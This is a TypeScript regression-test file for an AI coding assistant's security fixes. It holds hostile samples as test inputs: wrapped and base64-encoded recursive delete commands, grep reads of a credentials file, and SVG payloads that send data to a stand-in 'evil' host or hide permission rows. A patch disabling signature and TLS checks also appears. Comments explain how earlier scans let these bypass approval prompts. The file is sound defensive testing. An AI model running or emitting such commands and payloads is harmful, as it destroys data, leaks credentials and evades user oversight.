/**
 * Round 26: the third code review, one check per fix.
 *
 * Five fresh lanes - how model output is rendered, what a profile survives
 * across upgrades and two instances, the turn loop when things go wrong, what
 * grows over a long session, and an adversarial reading of everything the last
 * three days changed.
 *
 * The lane that mattered most was the last one. Two of round 25's own fixes
 * were incomplete in ways that reopened what they had just closed:
 * `env bash -c "rm -rf src"` deleted a tree with no question at all, because
 * the wrapper was unwrapped once and never looked inside again; and the
 * "a flag's value is not a path" change ate the file argument of
 * `grep -e x <appdata>/credentials.json`, so the saved sign-ins could be read
 * with nothing asked - the exact hole round 25 had closed for `cut`.
 *
 * Each check below fails on the code round 25 left behind.
 *
 * smoke.ts calls `roundTwentySixChecks` with its own check and section.
 * `root` is the checkout to read, the working directory unless given.
 */
import fs from "node:fs/promises"
import path from "node:path"
import type { Check } from "./smoke-round5"
import { scanCommand } from "../src/server/tool/bash-scan"
import { stripSvgHazards } from "../src/renderer/src/lib/svg-safe"
import { parseDiffFiles } from "../src/renderer/src/lib/diff-view"
import { renderReply } from "../src/renderer/src/lib/markdown"

/** Code without its comments, so a check reads what runs. */
function code(source: string): string {
  return source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/<!--[\s\S]*?-->/g, "").replace(/^\s*\/\/.*$/gm, "")
}

export async function roundTwentySixChecks(check: Check, section: (name: string) => void, root = process.cwd()): Promise<void> {
  const read = (relative: string) => fs.readFile(path.join(root, relative), "utf8")
  const here = process.cwd()
  const scan = (command: string, powershell = false) => scanCommand(command, here, here, powershell)

  // --------------------------------------------------------------- R26-1
  section("Round 26 (1): a command that deletes is found however it is wrapped")
  {
    /*
     * The bash tool's delete question - asked every time, never remembered - is
     * decided by this scan alone. `permission.ts` computes `forced` from
     * `input.forced ?? …` and bash passes `false`, so there is no second guard
     * behind it: a delete this scan misses runs unasked at full access.
     */
    for (const command of [
      'env bash -c "rm -rf src"',
      'sudo bash -c "rm -rf src"',
      'timeout 10 bash -c "rm -rf src"',
      "ls | xargs bash -c 'rm -rf .'",
      'bash -lc "rm -rf src"',
      'sh -xc "rm -rf src"',
      'eval "rm -rf src"',
    ]) {
      const found = await scan(command)
      check(`a delete behind ${command.split(" ")[0]} is found: ${command}`, found.deletes.length > 0, found.deletes)
    }
    const posh = await scan('powershell -ep bypass -Command "Remove-Item -Recurse -Force X"', true)
    check("an execution-policy flag is not mistaken for the code flag", posh.deletes.length > 0, posh.deletes)
    const encoded = Buffer.from("Remove-Item -Recurse -Force X", "utf16le").toString("base64")
    const enc = await scan(`powershell -enc ${encoded}`, true)
    check("and an encoded command is decoded before it is read", enc.deletes.length > 0, enc.deletes)

    // Still no "always" taken from a command read out of another one.
    const inner = await scan('env bash -c "npm test"')
    check("an always is still only the line as it was written", inner.always.length === 1 && inner.always[0] === 'env bash -c "npm test"', inner.always)
    for (const ordinary of ["npm run build", "git status", "node -e \"console.log(1)\""]) {
      const found = await scan(ordinary)
      check(`an ordinary line raises no delete: ${ordinary}`, found.deletes.length === 0, found.deletes)
    }
  }

  // --------------------------------------------------------------- R26-2
  section("Round 26 (2): a file argument is never read as a pattern")
  {
    /*
     * Round 25 stopped offering a flag's count as a path, and in doing so ate
     * the path itself: `grep -e x <secrets>` had `x` skipped as the flag's
     * value and the file skipped as "the pattern", so `scan.files` was empty,
     * `guardAppData` never ran, and grep - being read-only - printed the file
     * with nothing asked. Reading a path as a pattern is the dangerous
     * direction; the other way costs a question nobody needed.
     */
    /*
     * A path with no spaces in it. The checkout's own path has them, so a
     * command built from it tokenises into several words and the last one is
     * pushed whatever the pattern slot did - which made this check pass for a
     * reason that had nothing to do with what it is named for.
     */
    const secret = path.join(path.parse(here).root, "secrets", "credentials.json")
    for (const command of [`grep -e x ${secret}`, `grep --regexp=secret ${secret}`, `grep -i secret ${secret}`, `rg -e x ${secret}`]) {
      const found = await scan(command)
      check(`the file is named, so the app-data guard sees it: ${command.slice(0, 32)}`, found.files.some((file) => file.endsWith("credentials.json")), found.files)
    }
    const counted = await scan("head -c 9999 notes.txt")
    check("a flag's count is still not offered as a path", !counted.files.some((file) => file.endsWith("9999")) && counted.files.some((file) => file.endsWith("notes.txt")), counted.files)
    const single = await scan("cat -n a")
    check("and a one-character file name is not dropped, since dropping one is how a path stops being checked", single.files.some((file) => file.endsWith(`${path.sep}a`)), single.files)
  }

  // --------------------------------------------------------------- R26-3
  section("Round 26 (3): a drawing in a reply cannot reach the web or restyle the window")
  {
    /*
     * `http:/host` and `http:host` reach the same host as `http://host` - the
     * URL parser is forgiving about the slashes - and both patterns here asked
     * for two, so a reply could name a web address with one and the drawing
     * fetched it the moment it was shown. That is the silent channel the
     * "a web picture waits for a click" rule exists to close.
     */
    for (const hostile of [
      '<image href="https://evil/p.png?d=secret"/>',
      '<image href="http:/evil/p.png?d=secret"/>',
      "<image xlink:href='http:/evil/p.png'/>",
      "<feImage href=http:/evil/x />",
      '<rect style="fill:url(http:/evil/x)"/>',
    ]) {
      check(`no web address survives: ${hostile.slice(0, 34)}`, !/evil/.test(stripSvgHazards(hostile)), stripSvgHazards(hostile))
    }
    /*
     * And a `<style>` inside an inline SVG is CSS for the whole document, not
     * for the drawing: a reply could hide the permission rows or paint over the
     * window with no script at all, and DOMPurify does not clean CSS text.
     */
    check("a drawing's own style block is removed", !/<style/i.test(stripSvgHazards("<style>[data-permission]{display:none!important}</style>")))
    const diagram = code(await read("src/renderer/src/lib/diagram.ts"))
    // Each of the three by name, or removing one still leaves a count that passes.
    for (const [name, sanitiser] of [
      ["the reply's own drawing", "sanitizeSvgFence"],
      ["a mermaid diagram", "sanitizeMermaidSvg"],
      ["a score", "sanitizeAbcSvg"],
    ] as const) {
      // Bounded to the function itself: a longer window spills into the next one, which has its own FORBID_TAGS.
      const from = diagram.indexOf(`export function ${sanitiser}`)
      const next = diagram.indexOf("export function ", from + 1)
      const body = diagram.slice(from, next === -1 ? undefined : next)
      check(`${name} forbids a style element`, /FORBID_TAGS: \[[^\]]*"style"/.test(body), body.slice(0, 260))
    }

    // What a drawing legitimately carries is untouched.
    check("a link still keeps its address, since following one takes a click", stripSvgHazards('<a href="https://example.com/ok">link</a>').includes("https://example.com/ok"))
    check("words on a picture are not edited", stripSvgHazards('<text x="1" y="1">see https://example.com for more</text>').includes("https://example.com"))
    check("and ordinary paint survives", stripSvgHazards('<rect style="fill:#abc;stroke:red"/>').includes("#abc"))
  }

  // --------------------------------------------------------------- R26-4
  section("Round 26 (4): a diff shows every file it changes, and every line of them")
  {
    /*
     * The counts come from the `@@` header, which a model writes and often
     * gets wrong. While a count remained, `--- a/next` was read as a deletion
     * line of the *previous* file's hunk - so a second file's changes appeared
     * under the first file's name and the second file never appeared at all.
     * This list is what the permission card shows before a write is approved.
     */
    const twoFiles = parseDiffFiles(
      ["--- a/README.md", "+++ b/README.md", "@@ -1,1 +1,5 @@", " hello", "--- a/src/auth.ts", "+++ b/src/auth.ts", "@@ -10,1 +10,1 @@", "-  if (!verifySignature(token)) return false", "+  return true"].join("\n"),
    )
    check("a second file with a wrong count is its own file, under its own name", twoFiles.length === 2 && twoFiles[1]?.name === "src/auth.ts", twoFiles.map((file) => file.name))
    check("and its change is counted there, not under the first file's name", twoFiles[1]?.added === 1 && twoFiles[1]?.deleted === 1 && twoFiles[0]?.added === 0, twoFiles.map((file) => [file.name, file.added, file.deleted]))

    /* A count that runs out early used to drop the rest of the hunk without a word. */
    const short = parseDiffFiles(["@@ -1,1 +1,1 @@", "-const ALLOW_ANY = false", "+const ALLOW_ANY = false", "-const CHECK_TLS = true", "+const CHECK_TLS = false"].join("\n"))
    const lines = short[0]?.hunks.reduce((count, hunk) => count + hunk.lines.length, 0) ?? 0
    check("a hunk longer than its own header still shows every line of it", lines === 4 && short[0]?.added === 2 && short[0]?.deleted === 2, { lines, added: short[0]?.added, deleted: short[0]?.deleted })

    const ordinary = parseDiffFiles("diff --git a/a.ts b/a.ts\n--- a/a.ts\n+++ b/a.ts\n@@ -1,3 +1,3 @@\n one\n-two\n+TWO\n three\n")
    check("and an ordinary patch is unchanged", ordinary.length === 1 && ordinary[0]?.added === 1 && ordinary[0]?.deleted === 1, ordinary.map((file) => [file.name, file.added, file.deleted]))
  }

  // --------------------------------------------------------------- R26-5
  section("Round 26 (5): a reply cannot freeze the window by being long or deep")
  {
    /*
     * The link pattern's address part was greedy and unbounded, so a line with
     * no closing bracket ran to the end and backtracked a character at a time.
     * Measured before the bound: 500 KB - exactly the cap the file page reads a
     * .md with - took 73 seconds of frozen window.
     */
    const long = "[a](".repeat(128 * 1024)
    const started = Date.now()
    renderReply(long, {})
    const spent = Date.now() - started
    check("half a megabyte of unclosed links renders in well under a second", spent < 3000, `${spent}ms`)

    /* The paragraph's script is read in one pass; bare addresses, a run of them or spaced ones, are skipped as they are met. */
    for (const [name, source] of [
      ["bare addresses run together", "中文 " + "http://".repeat(72 * 1024)],
      ["spaced bare addresses", "中文 " + "https://a.example/x ".repeat(26 * 1024)],
      ["a lone h repeated", "中文" + "h".repeat(512 * 1024)],
    ] as const) {
      const begun = Date.now()
      renderReply(source, {})
      const took = Date.now() - begun
      check(`${name} classify in well under a second`, took < 3000, `${took}ms`)
    }

    /* Each level of quoting is a frame; five thousand of them overflowed the stack, and 5 KB of text is five thousand. */
    let threw: string | undefined
    try {
      renderReply(">".repeat(6000) + " x", {})
    } catch (cause) {
      threw = cause instanceof Error ? cause.message : String(cause)
    }
    check("and six thousand nested quotes render rather than throwing", threw === undefined, threw)
    const nested = renderReply("> one\n>> two\n", {})
      .map((block) => (block.kind === "html" ? block.html : ""))
      .join("")
    check("while quoting still nests as it should", (nested.match(/md-quote/g) ?? []).length === 2, nested.slice(0, 160))
  }

  // --------------------------------------------------------------- R26-6
  section("Round 26 (6): two instances sharing one data directory do not delete each other's work")
  {
    /*
     * The start-up housekeeping deletes every checkpoint store the session list
     * does not name, and tombstones every artifact whose conversation it does
     * not name. The list it used was this process's cache, filled at start-up
     * and patched only by this process's own writes - so a conversation another
     * instance opened during the minutes this takes was deleted.
     */
    const store = code(await read("src/server/session/store.ts"))
    check("the store can be asked for the list as the folder holds it now", /async listFresh\(\): Promise<SessionInfo\[\]> \{[\s\S]{0,120}?this\.forgetList\(\)/.test(store))
    const backend = code(await read("src/server/index.ts"))
    check("and every pass that deletes what the list does not name asks that way", (backend.match(/sessions\.listFresh\(\)/g) ?? []).length >= 3, backend.match(/sessions\.list(?:Fresh)?\(\)/g))
    const snapshot = code(await read("src/server/session/snapshot.ts"))
    check("a store written in the last hour is kept whoever made it", /SWEEP_GRACE_MS/.test(snapshot) && /now - touched < SWEEP_GRACE_MS/.test(snapshot))

    /*
     * The remembered approvals were read once at start-up and written back
     * whole on every change, so an approval granted in the other window
     * vanished the moment this one remembered anything.
     */
    const permission = code(await read("src/server/permission.ts"))
    // R28-4 made the write a union of only what this process changed; round 28 drives two real instances.
    check("the remembered approvals are written over what is on disk now, not over a start-up copy", /const read = await storage\.readOrCorrupt<Partial<StoredRules>>\(RULES_KEY\)/.test(permission) && /for \(const \[key, rules\] of mine\) \{/.test(permission) && /this\.changed\.add\(key\)/.test(permission))
    check("and a project this process deliberately dropped does not come back from the file", /this\.forgotten\.add\(`session:\$\{sessionID\}`\)/.test(permission))
    check("a document that will not read is still not written over", /if \(read\.unreadable !== undefined \|\| read\.corrupt !== undefined\) return/.test(permission))
  }

  // --------------------------------------------------------------- R26-7
  section("Round 26 (7): the write ledger answers honestly in both directions")
  {
    /*
     * Round 25 stopped the *write* over a ledger it could not read and left the
     * read as it was - and the read's permissive answer ("nobody else touched
     * these") is the dangerous one, since it is what lets an undo write over
     * another conversation's later work.
     */
    const snapshot = code(await read("src/server/session/snapshot.ts"))
    check("a ledger this run could not read reports every file as a clash, rather than none", /if \(this\.ledgerUnreadable\(directory\)\) return \[\.\.\.files\]\.sort\(\)/.test(snapshot))
    check("the mark is checked rather than consumed, so it is not spent on somebody else's write", /if \(this\.ledgerUnreadable\(directory\)\) return\b/.test(snapshot) && !/unreadableLedgers\.delete\(this\.ledgerFile\(directory\)\)\)/.test(snapshot))
    check(
      "and a read that works clears it",
      // No closing brace between them: the clear in the failure branch above is a different statement.
      /this\.unreadableLedgers\.delete\(file\)[^}]{0,20}?if \(raw === undefined\) return \{\}/.test(snapshot),
      snapshot.slice(Math.max(0, snapshot.indexOf("if (raw === undefined)") - 140), snapshot.indexOf("if (raw === undefined)") + 40),
    )

    const config = code(await read("src/server/config.ts"))
    // R28-5: unopenable stays unrecorded; damaged and moved aside is recorded without widening (round 28 loads it twice).
    check("a migration that this run was not in a position to make is not recorded as done", /if \(apply\(\) === false\) return/.test(config) && /return this\.unreadable\.evidence !== undefined/.test(config))
  }
}
